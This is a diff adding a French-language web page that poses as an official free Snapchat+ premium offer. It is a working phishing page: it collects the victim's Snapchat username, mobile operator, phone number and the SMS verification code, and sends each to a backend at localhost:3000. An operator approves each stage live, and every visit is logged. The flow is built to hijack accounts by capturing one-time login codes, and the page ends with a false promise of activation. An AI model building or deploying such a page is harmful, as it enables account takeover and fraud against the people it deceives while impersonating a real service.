@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Snapchat+ | Accès Premium</title>
+  
+  <!-- Police moderne et géométrique -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --primary: #fffc00; /* Jaune Snapchat */
+      --accent: #8b5cf6;  /* Violet moderne */
+      --bg-dark: #0f172a;
+      --glass-bg: rgba(255, 255, 255, 0.03);
+      --glass-border: rgba(255, 255, 255, 0.08);
+      --text-main: #ffffff;
+      --text-muted: #94a3b8;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
+
+    body {
+      background-color: var(--bg-dark);
+      /* Fond animé subtil */
+      background-image: 
+        radial-gradient(circle at 15% 50%, rgba(139, 92, 246, 0.15), transparent 25%),
+        radial-gradient(circle at 85% 30%, rgba(255, 252, 0, 0.1), transparent 25%);
+      color: var(--text-main);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    /* Conteneur Principal */
+    .container {
+      width: 100%;
+      max-width: 460px;
+      background: var(--glass-bg);
+      backdrop-filter: blur(24px) saturate(180%);
+      -webkit-backdrop-filter: blur(24px) saturate(180%);
+      border-radius: 32px;
+      border: 1px solid var(--glass-border);
+      box-shadow: 
+        0 25px 50px -12px rgba(0, 0, 0, 0.5),
+        inset 0 1px 1px rgba(255, 255, 255, 0.1);
+      overflow: hidden;
+      position: relative;
+    }
+
+    /* Header */
+    header {
+      padding: 48px 30px 30px;
+      text-align: center;
+      border-bottom: 1px solid var(--glass-border);
+    }
+
+    .logo-container {
+      position: relative;
+      display: inline-block;
+      margin-bottom: 20px;
+    }
+
+    .logo {
+      width: 80px;
+      height: 80px;
+      background: linear-gradient(135deg, #fffc00, #facc15);
+      border-radius: 24px; /* Coins légèrement arrondis mais carrés */
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 42px;
+      box-shadow: 0 0 30px rgba(255, 252, 0, 0.3);
+      animation: float 6s ease-in-out infinite;
+    }
+
+    h1 { 
+      font-size: 2rem; 
+      font-weight: 800; 
+      letter-spacing: -0.5px;
+      margin-bottom: 4px;
+    }
+
+    .subtitle { 
+      color: var(--text-muted); 
+      font-size: 0.95rem; 
+      font-weight: 500;
+    }
+
+    /* Barre de progression */
+    .progress-bar {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+      padding: 24px 30px 10px;
+    }
+    
+    .dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background-color: rgba(255,255,255,0.1);
+      transition: all 0.3s ease;
+    }
+    
+    .dot.active { 
+      width: 24px; 
+      border-radius: 12px; 
+      background-color: var(--accent); 
+      box-shadow: 0 0 10px rgba(139, 92, 246, 0.5);
+    }
+
+    /* Steps */
+    .step {
+      padding: 30px;
+      display: none;
+      animation: fadeSlideUp 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+    }
+
+    .step.active { display: block; }
+
+    h2 { 
+      text-align: center; 
+      margin-bottom: 24px; 
+      font-size: 1.5rem; 
+      font-weight: 700; 
+    }
+
+    /* Cards (Offres) */
+    .offer-card {
+      background: rgba(255,255,255,0.03);
+      border: 1px solid var(--glass-border);
+      border-radius: 20px;
+      padding: 24px;
+      margin-bottom: 16px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .offer-card:hover { 
+      transform: translateY(-4px); 
+      background: rgba(255,255,255,0.06);
+      border-color: var(--accent);
+    }
+
+    .popular-badge {
+      position: absolute;
+      top: 12px; right: 12px;
+      background: linear-gradient(90deg, #8b5cf6, #ec4899);
+      color: white;
+      font-size: 0.7rem;
+      padding: 4px 10px;
+      border-radius: 20px;
+      font-weight: 700;
+      text-transform: uppercase;
+    }
+
+    .offer-title { font-size: 1.1rem; font-weight: 600; margin-bottom: 8px; color: #fff; }
+    
+    .duration-display { 
+      font-size: 2.5rem; 
+      font-weight: 800; 
+      background: linear-gradient(to right, #fff, #94a3b8);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 12px;
+    }
+
+    /* Inputs */
+    .input-group { position: relative; margin-bottom: 20px; }
+    
+    input {
+      width: 100%;
+      padding: 18px 20px;
+      font-size: 1.1rem;
+      background: rgba(0,0,0,0.3);
+      border: 1px solid var(--glass-border);
+      border-radius: 16px;
+      color: white;
+      outline: none;
+      transition: all 0.2s ease;
+    }
+
+    input:focus { 
+      background: rgba(0,0,0,0.5); 
+      border-color: var(--accent); 
+      box-shadow: 0 0 0 4px rgba(139, 92, 246, 0.15);
+    }
+
+    input::placeholder { color: #475569; font-weight: 500; }
+
+    /* Boutons */
+    .btn {
+      width: 100%;
+      padding: 18px;
+      font-size: 1.1rem;
+      font-weight: 700;
+      border: none;
+      border-radius: 16px;
+      background: linear-gradient(90deg, #8b5cf6, #ec4899);
+      color: white;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 10px 20px -5px rgba(139, 92, 246, 0.4);
+    }
+
+    .btn:hover { 
+      transform: translateY(-2px); 
+      box-shadow: 0 15px 25px -5px rgba(139, 92, 246, 0.5);
+    }
+
+    .btn:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
+
+    /* Info Box */
+    .info-box {
+      background: rgba(139, 92, 246, 0.1);
+      border: 1px solid rgba(139, 92, 246, 0.2);
+      color: #c4b5fd;
+      padding: 16px;
+      border-radius: 12px;
+      font-size: 0.9rem;
+      text-align: center;
+      margin-bottom: 24px;
+    }
+
+    /* Legal */
+    .legal {
+      text-align: center;
+      padding: 20px;
+      color: #64748b;
+      font-size: 0.8rem;
+      border-top: 1px solid var(--glass-border);
+    }
+
+    /* Toast Notification */
+    .toast {
+      position: fixed;
+      bottom: 30px; left: 50%;
+      transform: translateX(-50%) translateY(100px);
+      background: #1e293b;
+      color: white;
+      padding: 14px 28px;
+      border-radius: 50px;
+      font-size: 0.9rem;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+      opacity: 0;
+      transition: all 0.4s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+      z-index: 999;
+      display: flex; align-items: center; gap: 10px;
+    }
+    .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
+
+    /* Spinner */
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid rgba(255,255,255,0.1);
+      border-top-color: var(--accent);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+
+    /* Animations */
+    @keyframes float { 
+      0%, 100% { transform: translateY(0) rotate(0deg); } 
+      50% { transform: translateY(-8px) rotate(2deg); } 
+    }
+    
+    @keyframes fadeSlideUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Optimisation 100% Mobile */
+    @media (max-width: 480px) {
+      body {
+        padding: 0;
+      }
+      .container {
+        max-width: 100%;
+        min-height: 100vh;
+        border-radius: 0;
+        border: none;
+        box-shadow: none;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+      }
+      header {
+        padding: 40px 20px 20px;
+        border-bottom: none;
+      }
+      .step {
+        padding: 20px;
+      }
+      .legal {
+        margin-top: auto;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <header>
+      <div class="logo-container">
+        <div class="logo">👻</div>
+      </div>
+      <h1>Snapchat+</h1>
+      <p class="subtitle">Accès Premium Gratuit</p>
+    </header>
+
+    <!-- Indicateur d'étapes -->
+    <div class="progress-bar" id="progressBar">
+      <div class="dot active"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+
+    <!-- Étape 1 : Choix -->
+    <div id="step1" class="step active">
+      <h2>Sélectionnez votre offre</h2>
+      
+      <div class="offer-card" onclick="selectOffer(1)">
+        <div class="offer-title">Découverte</div>
+        <div class="duration-display">1 mois</div>
+        <div style="color:var(--text-muted); font-size:0.9rem;">Accès complet aux fonctionnalités</div>
+      </div>
+
+      <div class="offer-card" onclick="selectOffer(12)">
+        <div class="popular-badge">MEILLEURE OFFRE</div>
+        <div class="offer-title">Premium Annuel</div>
+        <div class="duration-display">12 mois</div>
+        <div style="color:var(--text-muted); font-size:0.9rem;">Économisez 11 mois • Accès VIP</div>
+      </div>
+    </div>
+
+    <!-- Étape 2 : Username -->
+    <div id="step2" class="step">
+      <h2>Votre Identifiant</h2>
+      <input type="text" id="username" placeholder="@pseudo_snapchat" autocomplete="off">
+      <button class="btn" onclick="goToOperator()">Continuer</button>
+    </div>
+
+    <!-- Étape 3 : Opérateur -->
+    <div id="step3" class="step">
+      <h2>Votre Opérateur</h2>
+      <div class="offer-card" onclick="selectOperator('Orange')" style="text-align: center;">
+        <div class="offer-title" style="margin-bottom: 0;">Orange</div>
+      </div>
+      <div class="offer-card" onclick="selectOperator('SFR')" style="text-align: center;">
+        <div class="offer-title" style="margin-bottom: 0;">SFR</div>
+      </div>
+      <div class="offer-card" onclick="selectOperator('Bouygues Telecom')" style="text-align: center;">
+        <div class="offer-title" style="margin-bottom: 0;">Bouygues Telecom</div>
+      </div>
+    </div>
+
+    <!-- Étape 4 : Téléphone -->
+    <div id="step4" class="step">
+      <h2>Votre Numéro</h2>
+      <div style="display: flex; gap: 10px; margin-bottom: 20px;">
+        <select id="countryCode" style="padding: 18px 10px; font-size: 1.1rem; background: rgba(0,0,0,0.3); border: 1px solid var(--glass-border); border-radius: 16px; color: white; outline: none; width: 110px;">
+          <option value="+33">🇫🇷 +33</option>
+          <option value="+32">🇧🇪 +32</option>
+          <option value="+41">🇨🇭 +41</option>
+        </select>
+        <input type="tel" id="phone" placeholder="Numéro..." maxlength="12" inputmode="numeric" style="flex: 1; margin-bottom: 0;">
+      </div>
+      <button class="btn" id="sendBtn" onclick="sendNumber()">Recevoir le code par SMS</button>
+    </div>
+
+    <!-- Étape 5 : Chargement -->
+    <div id="step5" class="step">
+      <h2>Patientez...</h2>
+      <div style="text-align:center; margin: 30px 0;">
+        <div class="spinner"></div>
+        <p style="margin-top: 15px; color: var(--text-muted);">Envoi du code en cours...</p>
+      </div>
+    </div>
+
+    <!-- Étape 6 : Code -->
+    <div id="step6" class="step">
+      <h2>Vérification</h2>
+      <div class="info-box" id="codeInfoBox">
+        Un code à 4 chiffres a été envoyé sur votre numéro.
+      </div>
+      <input type="text" id="code" placeholder="0000" maxlength="4" inputmode="numeric" style="font-size: 2rem; letter-spacing: 15px; text-align:center;">
+      <button class="btn" id="validateBtn" onclick="submitCode()">Valider le code</button>
+      
+      <div id="codeSpinner" style="display:none; text-align:center; margin: 20px 0;">
+        <div class="spinner"></div>
+        <p style="margin-top: 15px; color: var(--text-muted);">Vérification du code en cours...</p>
+      </div>
+    </div>
+
+    <!-- Étape 7 : Succès -->
+    <div id="step7" class="step">
+      <div style="text-align:center; padding: 20px 0;">
+        <div style="font-size: 4rem; margin-bottom: 20px;">🎉</div>
+        <h2>Félicitations !</h2>
+        <p style="color: var(--text-muted); font-size: 1.1rem; line-height: 1.6; margin-bottom: 30px;">
+          Votre code a été validé avec succès.<br><br>
+          <strong style="color: #22c55e;">Votre abonnement Snapchat+ sera activé sur votre compte d'ici 5 à 10 minutes.</strong>
+        </p>
+        <button class="btn" onclick="resetAll()">Terminer</button>
+      </div>
+    </div>
+
+    <div class="legal">
+      Opération officielle • Sécurité SSL
+    </div>
+  </div>
+
+  <!-- Toast Notification -->
+  <div id="toast" class="toast"></div>
+
+  <script>
+    let selectedMonths = 12;
+    let username = "";
+    let selectedOperator = "";
+    let phoneNumber = "";
+    let isSending = false;
+    let codeAlreadySent = false;
+    let currentSessionId = null;
+    let pollInterval = null;
+
+    // --- Navigation & Logique ---
+
+    function selectOffer(months) {
+      selectedMonths = months;
+      showStep(2);
+    }
+
+    function updateProgress(stepIndex) {
+      const dots = document.querySelectorAll('.dot');
+      dots.forEach((dot, index) => {
+        if (index < stepIndex && index < dots.length) dot.classList.add('active');
+        else dot.classList.remove('active');
+      });
+    }
+
+    function showStep(stepNum) {
+      // Masquer toutes les étapes
+      document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+      // Afficher la cible avec animation
+      const target = document.getElementById('step' + stepNum);
+      if(target) {
+        target.classList.add('active');
+        updateProgress(stepNum - 1); // Index starts at 0 for dots logic relative to steps
+      }
+    }
+
+    function goToOperator() {
+      username = document.getElementById('username').value.trim();
+      if (username.length < 3) {
+        showToast("❌ Veuillez entrer un pseudo valide.");
+        return;
+      }
+      showStep(3);
+    }
+
+    function selectOperator(operator) {
+      selectedOperator = operator;
+      showStep(4);
+    }
+
+    async function sendNumber() {
+      const btn = document.getElementById('sendBtn');
+      if (isSending) return;
+
+      isSending = true;
+      btn.disabled = true;
+      btn.textContent = "Connexion...";
+
+      // Nettoyage du numéro : enlève les espaces
+      let phone = document.getElementById('phone').value.trim().replace(/\s+/g, '');
+      let countryCode = document.getElementById('countryCode').value;
+
+      // Validation souple : 8 à 12 chiffres
+      if (!/^\d{8,12}$/.test(phone)) {
+        showToast("❌ Numéro invalide.");
+        resetSendButton();
+        return;
+      }
+
+      phoneNumber = countryCode + " " + phone;
+      
+      try {
+        const res = await fetch('http://localhost:3000/api/request', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                username,
+                phoneNumber,
+                selectedOperator,
+                selectedMonths
+            })
+        });
+        const data = await res.json();
+        
+        if (data.sessionId) {
+            currentSessionId = data.sessionId;
+            showStep(5); // Étape chargement
+            startPolling();
+        } else {
+            showToast("❌ Erreur serveur.");
+            resetSendButton();
+        }
+      } catch (e) {
+          console.error(e);
+          showToast("❌ Impossible de joindre le serveur.");
+          resetSendButton();
+      }
+    }
+
+    function startPolling() {
+        pollInterval = setInterval(async () => {
+            if (!currentSessionId) return clearInterval(pollInterval);
+            
+            try {
+                const res = await fetch(`http://localhost:3000/api/status/${currentSessionId}`);
+                const data = await res.json();
+                
+                if (data.status === 'accepted') {
+                    clearInterval(pollInterval);
+                    showStep(6); // Étape code
+                    showToast("✅ Code envoyé par SMS !");
+                } else if (data.status === 'refused') {
+                    clearInterval(pollInterval);
+                    showToast("❌ Demande refusée par l'administrateur.");
+                    resetAll();
+                }
+            } catch (e) {
+                console.error(e);
+            }
+        }, 2000); // Polling toutes les 2 secondes
+    }
+
+    function resetSendButton() {
+      const btn = document.getElementById('sendBtn');
+      isSending = false;
+      btn.disabled = false;
+      btn.textContent = "Recevoir le code par SMS";
+    }
+
+    // --- Webhooks ---
+
+    async function submitCode() {
+      const code = document.getElementById('code').value.trim();
+      const btn = document.getElementById('validateBtn');
+
+      // Validation stricte : exactement 4 chiffres
+      if (!/^\d{4}$/.test(code)) {
+        showToast("❌ Le code doit contenir exactement 4 chiffres.");
+        return;
+      }
+
+      if (codeAlreadySent) return;
+
+      codeAlreadySent = true;
+      btn.disabled = true;
+      
+      // Cacher les éléments et afficher le spinner
+      btn.style.display = 'none';
+      document.getElementById('codeInfoBox').style.display = 'none';
+      document.getElementById('code').style.display = 'none';
+      document.getElementById('codeSpinner').style.display = 'block';
+
+      try {
+          await fetch('http://localhost:3000/api/submit-code', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ sessionId: currentSessionId, code })
+          });
+          startCodePolling();
+      } catch(e) {
+          showToast("❌ Erreur de connexion.");
+          codeAlreadySent = false;
+          
+          document.getElementById('codeSpinner').style.display = 'none';
+          document.getElementById('codeInfoBox').style.display = 'block';
+          document.getElementById('code').style.display = 'block';
+          
+          btn.disabled = false;
+          btn.style.display = 'block';
+          btn.textContent = "Valider le code";
+      }
+    }
+
+    function startCodePolling() {
+        pollInterval = setInterval(async () => {
+            if (!currentSessionId) return clearInterval(pollInterval);
+            
+            try {
+                const res = await fetch(`http://localhost:3000/api/status/${currentSessionId}`);
+                const data = await res.json();
+                
+                if (data.status === 'code_accepted') {
+                    clearInterval(pollInterval);
+                    showStep(7);
+                } else if (data.status === 'code_refused') {
+                    clearInterval(pollInterval);
+                    showToast("❌ Code invalide, veuillez réessayer.");
+                    document.getElementById('code').value = "";
+                    codeAlreadySent = false;
+                    
+                    // Réafficher l'input et cacher le spinner
+                    document.getElementById('codeSpinner').style.display = 'none';
+                    document.getElementById('codeInfoBox').style.display = 'block';
+                    document.getElementById('code').style.display = 'block';
+                    
+                    const btn = document.getElementById('validateBtn');
+                    btn.disabled = false;
+                    btn.style.display = 'block';
+                    btn.textContent = "Valider le code";
+                }
+            } catch (e) {
+                console.error(e);
+            }
+        }, 2000);
+    }
+
+    function resetAll() {
+      username = "";
+      selectedOperator = "";
+      phoneNumber = "";
+      codeAlreadySent = false;
+      currentSessionId = null;
+      if (pollInterval) clearInterval(pollInterval);
+      
+      document.getElementById('username').value = "";
+      document.getElementById('phone').value = "";
+      document.getElementById('code').value = "";
+      
+      resetSendButton();
+      
+      const valBtn = document.getElementById('validateBtn');
+      valBtn.disabled = false;
+      valBtn.style.display = 'block';
+      valBtn.textContent = "Valider le code";
+      
+      document.getElementById('codeSpinner').style.display = 'none';
+      document.getElementById('codeInfoBox').style.display = 'block';
+      document.getElementById('code').style.display = 'block';
+      
+      showStep(1);
+    }
+
+    // --- UI Helpers ---
+
+    function showToast(message) {
+      const toast = document.getElementById('toast');
+      toast.textContent = message;
+      toast.classList.add('show');
+      setTimeout(() => {
+        toast.classList.remove('show');
+      }, 3000);
+    }
+
+    // Input Listeners (Uniquement chiffres pour phone et code)
+    document.addEventListener('DOMContentLoaded', () => {
+      // Notification de visite du site
+      fetch('http://localhost:3000/api/visit', { method: 'POST' }).catch(() => {});
+
+      const phoneInput = document.getElementById('phone');
+      phoneInput.addEventListener('input', function() {
+        this.value = this.value.replace(/[^0-9]/g, '');
+      });
+
+      const codeInput = document.getElementById('code');
+      codeInput.addEventListener('input', function() {
+        this.value = this.value.replace(/[^0-9]/g, '');
+      });
+    });
+  </script>
+</body>
+</html>
